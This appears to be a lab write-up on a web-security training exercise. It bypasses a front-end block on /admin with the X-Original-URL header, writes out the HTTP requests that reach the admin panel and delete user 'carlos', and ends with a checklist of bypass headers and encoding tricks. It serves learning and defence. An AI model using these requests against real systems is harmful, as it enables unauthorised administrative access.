
this one is quite interesting. so we have an admin panel at `/admin` but it's blocked for external users. the block seems to come from a front-end system, because the response is very plain and not like the normal app. the hint is that the back-end framework supports the `X-Original-URL` header. classic misconfiguration.

**first, let's try to reach `/admin` directly:**

```
GET /admin HTTP/2
Host: blah.web-security-academy.net
Cookie: session=...
...
```
**response: plain text "Access denied" or something. no normal HTML. obviously a front-end blocker.**

**now the trick: we keep the request line as `/` (or anything allowed) and add a header `X-Original-URL: /invalid`. that will make the back-end process the header value as the actual URL. let's see:**

```
GET / HTTP/2
Host: blah.web-security-academy.net
Cookie: session=...
X-Original-URL: /invalid
...
```
**we get a 404 "not found". this means the back-end really is using that header to determine the resource. bingo.**

**so if we set `X-Original-URL: /admin`, we can sneak past the front-end, because the front-end sees the request line is `/` and allows it, but the back-end sees the header and serves the admin panel. let's try:**

```
GET / HTTP/2
Host: blah.web-security-academy.net
Cookie: session=...
X-Original-URL: /admin
...
```
**and boom, we get the admin page in the response body. the front-end is completely bypassed. now we just need to delete carlos. the delete function is at `/admin/delete?username=carlos`. but careful: the query string has to be in the actual request line, because the back-end might parse it from there, while the path comes from the header. so we do:**

```
GET /?username=carlos HTTP/2
Host: blah.web-security-academy.net
Cookie: session=...
X-Original-URL: /admin/delete
...
```
**and yes, carlos is gone. lab solved.**

---

**so what's the lesson here?**

from a bug bounty view, this is a classic **front-end / back-end discrepancy**. the front-end (maybe a reverse proxy, WAF, or just a simple nginx rule) blocks requests to `/admin`, but the back-end application (some framework) respects an alternative way to specify the URL, like the `X-Original-URL` header. this header is sometimes used by proxies to pass the original request path to the application after rewriting. if the app blindly uses it, an attacker can override the actual path.

this is why you should never trust just the front-end to enforce access control. the back-end must independently verify that the user is authorized for the requested resource, no matter where the path comes from (URL, header, etc.). also, developers should disable such headers in production if they're not needed, or at least sanitize them.

as a hunter, whenever you see a 403/block on a path, try these headers:
- `X-Original-URL`
- `X-Rewrite-URL`
- `X-Forwarded-Path`
- Override the request line with a different path and use a header like `X-HTTP-Method-Override` for methods, etc.
- also try URL-encoding, double-encoding, or using `..;/` if it's a path traversal block.

this lab is a perfect example of "hey, the door is locked but the window is open". always check how the back-end interprets the request. that's it.